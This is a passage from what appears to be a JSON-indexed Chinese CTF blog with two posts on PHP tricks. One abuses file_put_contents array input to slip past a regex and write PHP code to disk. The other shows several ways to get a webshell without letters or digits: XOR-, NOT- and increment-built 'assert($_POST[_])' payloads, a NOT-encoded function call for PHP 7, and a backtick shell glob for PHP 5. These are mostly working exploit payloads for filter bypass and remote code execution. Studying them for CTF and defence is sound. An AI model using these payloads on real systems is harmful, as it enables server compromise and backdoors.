先来个官网介绍可以看见，filename是要被写入数据的文件名；data是写入的数据，类型可以是string，array；data可以是数组，但是不能是多维数组，相当于file_put_contents（$filename,join(‘’,$array)），如果第二个参数传入的是数组，则它们会以字符串的形式拼接起来 这里有个可以利用的地方就是，我们第二个参数可以传入一个数组，这样在进行正则拼接的时候，数组会强制转化成字符串，也就是会变成$title.Array，这样当然是可以符合规则的，所以就可以绕过正则的限制了，而且很秀的是，刚刚好file_put_contents是可以执行数组的最后的payload： 1?title=s&amp;data[]=&lt;?php%0a&amp;data[]=phpinfo(); 最后我们可以看见，a.php确实写进了phpinfo()，至此，我们就可以利用这个漏洞写个马了 最后补一句，其实这个漏洞在fopen(),fwrite(), fclose()也是存在的","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/23/一个php的小trick：file_put_contents/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"没有字母数字获得webshell","date":"2018-10-18T16:00:00.000Z","path":"2018/10/19/没有字母数字获得webshell/","text":"基础版获得webshell很简单，但是遇到waf的时候狗就不是那么有活路了，随便记记以防忘了。先给个题好吧1234&lt;?phpif (!preg_match('/[A-Za-z0-9]/is',$_GET['shell']))&#123; eval($_GET['shell']);&#125; 可以看到有个eval函数，嗯，是个好东西，但是所有英文和数字都被过滤了怎么办 方法一php有个trick，两个非字母的字符异或在一起可以产生一个字母，所以我们就可以这样去绕过了首先用个assert函数去获得shell，这里注意一点是，php7以前，assert是一个函数，可以通过$a=’assert’;$a(xxxx)这样去动态执行代码，但是到了php7就不行了，下面还会给到php7的方法好吧，不慌 php5先看一下这样一串代码12345&lt;?php$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]); 通过异或获得字母然后执行phpinfo() php7这里可以直接用原本的eval函数就行123&lt;?php$_=('%8F'^'%FF').('%7F'^'%17').('%8F'^'%FF').('%7F'^'%16').('%35'^'%5B').('%5B'^'%3D').('%34'^'%5B');$_(); 方法二利用取反进行操作，汉字的utf-8编码提取其字符再取反，例如’来’{1}取反就是b所以payload就是12345678&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');//这里是两个true相加，就是1+1$_=$__/$__;//2除2$____='';$___=\"瞰\";$____.=~($___&#123;$_&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"和\";$____.=~($___&#123;$__&#125;);$___=\"的\";$____.=~($___&#123;$_&#125;);$___=\"半\";$____.=~($___&#123;$_&#125;);$___=\"始\";$____.=~($___&#123;$__&#125;);$_____='_';$___=\"俯\";$_____.=~($___&#123;$__&#125;);$___=\"瞰\";$_____.=~($___&#123;$__&#125;);$___=\"次\";$_____.=~($___&#123;$_&#125;);$___=\"站\";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);//assert($_POST[2]) 故2=xxx即可执行任意代码 方法三在php里面，字符++可以得到下一个字符，举个栗子：’a’++=&gt;’b’，’b’++=&gt;’c’那么怎么能有个字母呢，数组的在php里面是array，如果我们echo ‘[]’，是可以得到ARRAY的，又因为在php里面大小写是不敏感的，所以问题就解决了12345678910111213141516171819202122232425262728293031323334$_=[];$_=@\"$_\"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); 升级版好了，简单版的是这样的，如果后台加多个限制，不给用$和_，而且还不准超过35个字符怎么办123456789101112if(isset($_GET['shell']))&#123; $code = $_GET['shell']; if(strlen($code)&gt;35)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_$]+/\",$code))&#123; die(\"NO.\"); &#125; eval($code);&#125;else&#123; highlight_file(__FILE__);&#125; 在php7里面，(‘phpinfo’)();这样是可以执行函数的，所以只要改一下里面的phpinfo，还是可以执行任意函数漏洞的，但是不给用字母，根据上面的思路，我们可以对ascii码取个反，继续执行payload1(~%8F%97%8F%96%91%99%90)(); 但是在php5里面不能像php7一样动态执行函数怎么办呢跳一下出去，不局限在php里面，直接去执行linux也是可以的 1?&gt;&lt;?=`. /???/??????;`?&gt; 如果有多个文件想要特别匹配的话，可以[^x]表示不匹配x，[0-9]表示这个位置的字符是0-9之间的，这样就可以特意匹配了 参考：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.htmlhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html","comments":true,"permalink":"https://xi4or0uji.github.io/2018/10/19/没有字母数字获得webshell/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]}]